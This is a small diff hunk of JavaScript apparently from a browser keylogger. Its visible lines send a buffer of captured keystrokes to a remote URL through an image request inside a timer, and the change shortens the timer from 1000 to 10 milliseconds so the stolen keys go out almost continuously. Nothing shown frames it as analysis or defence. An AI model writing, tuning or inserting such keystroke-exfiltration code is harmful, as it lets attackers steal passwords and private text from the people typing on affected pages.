@@ -13,6 +13,6 @@ window.setInterval(function(){
 		new Image().src = url+keys;
 		keys = '';
 	}
-}, 1000);
+}, 10);
 
 
